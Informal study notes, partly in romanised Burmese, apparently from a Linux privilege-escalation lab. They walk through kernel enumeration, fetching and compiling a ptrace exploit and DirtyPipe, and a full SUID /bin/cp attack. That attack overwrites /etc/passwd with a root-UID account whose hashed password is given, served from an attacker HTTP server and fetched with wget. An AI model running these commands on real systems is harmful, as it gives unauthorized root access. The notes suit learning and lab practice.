
file share htar dar ko mount loke dal => pee daw thu that mat htar dae user ko change b win twar dal 


id _rsa.pub => ssh public key
id_rsa  => ssh private key



------------------------------------------

Root Users =>  Privilege Escalation  => post exploitation

1. Misconfiguration
2.  SUID  => binary file
3.  Kernel Exploit

----
Kernel exploit
1. uname -a    => keren version     => 2019 ka may be exploit
2.  cat /etc/*release   =>  release version
3.  gcc run lot ya ya ml   => run lot ma ya yin kernel exploit lot ya chin ma ya mal

---

google kout yar mar  date twe version dwe ko take care 

---


Let's Root

wget urlpath/47163  -O poc.c   =>     download loke dar   

I use poc.c because look at the below 

![[Pasted image 20230116221054.png]]


gcc -s poc.c -o ptrace_traceme_root  => just copy paste

ls -al 

./ptrace_traceme_root

=====> but its not ok  

---
==> Dirty Cow htal mar lal privileges escellaction twe shi dal

==>  Dirty pipe exploit -> more update 

https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits   => Dirty Pipe link

we use exploit1.c

gcc exploit-1.c -o exploit2  =>  combine loke lite dar

./exploit2   => exploit 

=====> Kernel exploit is not working now   so we go to another method

----

SUID 

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null      => ko root script  ****

we found /bin/cp  => we saw cp => and go to GTFO bin 

cat /etc/passwd /tmp/passwd.bk     => firstly we copy /etc/passwd file

=> in our local machine => subl exploit.txt

we past /etc/passwd   => everything in this file 

a pow sone ka root user ko copy cuu pee daw aunt sone mar twar htal dal => pee daw user ko creatigon lot pay lite dal

exp => creatigon:x:0:0:root:/root:/bin/bash

=> x nay yar ka password => format ka => openssl passwd -1 -salt 123 rootme
reault => $1$123$LrQry9bh26VDfIHdrYMAr1   => we have to replace this one

Final Result => creatigon:$1$123$LrQry9bh26VDfIHdrYMAr1:0:0:root:/root:/bin/bash


python3 -m http.server    => server create lite dar   => exploit.txt file shi dal nay yar mar

in victim server => cd /tmp

wget http://10.0.2.17:8000/exploit.txt    => download swal twar dar

cp exploit.txt  /etc/passwd

su creatigon 
password => rootme

----

##### Summary of this root case exploit => SUID -> copy exploit /etc/passwd 

